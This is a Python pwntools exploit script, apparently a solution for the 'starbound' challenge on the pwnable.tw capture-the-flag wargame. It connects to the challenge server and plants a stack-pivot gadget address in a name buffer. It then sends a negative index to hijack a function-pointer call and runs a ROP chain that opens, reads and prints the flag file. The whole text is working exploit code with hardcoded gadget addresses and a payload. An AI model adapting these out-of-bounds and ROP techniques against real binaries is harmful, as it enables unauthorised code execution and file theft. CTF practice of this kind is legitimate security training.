from pwn import *


sa = lambda delim, data: p.sendafter(delim, data)
s = lambda data: p.send(data)
sla = lambda delim, data: p.sendlineafter(delim, data)
sl = lambda data: p.sendline(data)

elf = context.binary = ELF('starbound')


def set_name(name):
    sla(b'> ', b'6')
    sla(b'> ', b'2')
    sa(b'name: ', name)
    sla(b'> ', b'1') #name
#nc chall.pwnable.tw 10202
p = remote('chall.pwnable.tw', 10202)
#p = process()
#gdb.attach(p, gdbscript='''
#           b *(main + 88)
#c''')

NAME = 0x080580D0
ADD_ESP_0x1C = 0x08048e48 #: add esp, 0x1c ; ret
BASE_PTR = 0x8058154
BSS = 0x8058100
set_name(p32(ADD_ESP_0x1C) + b'\x00')
print('Do rop')
payload = b'-' + str((BASE_PTR - NAME) // 4).encode() + b'\x00'
payload += b'A'*(0x8 - len(payload))


rop = ROP(elf)
rop.read(0, BSS, 0x100)
rop.open(BSS, 0)
rop.read(3, BSS + 0x50, 0x100)
rop.write(1, BSS + 0x50, 0x100)


payload += rop.chain()
print('len: ', hex(len(payload)))
sla(b'> ', payload)

input("Send flag")
s(b'/home/starbound/flag')


p.interactive()